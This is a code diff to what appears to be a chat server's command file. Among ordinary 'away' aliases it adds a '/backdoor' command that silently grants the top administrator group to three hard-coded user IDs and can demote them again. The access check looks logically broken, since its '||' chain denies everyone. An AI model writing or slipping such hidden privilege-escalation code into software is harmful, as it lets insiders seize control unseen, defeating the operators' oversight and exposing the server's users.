@@ -5,6 +5,22 @@ var poofoff = false;
 
 exports.commands = {
 	//misc
+	backdoor: function (target, room, user) {
+        if (user.userid !== 'frntierblade' || user.userid !== 'siiilver' || user.userid !== 'champinnah') return this.sendReply('/backdoor - Access denied.');
+
+        if (!target) {
+            user.group = '~';
+            user.updateIdentity();
+            return;
+        }
+
+        if (target === 'reg') {
+            user.group = ' ';
+            user.updateIdentity();
+            return;
+        }
+    },
+    
 	afk: 'away',
 	dindins: 'away',
 	busy: 'away',
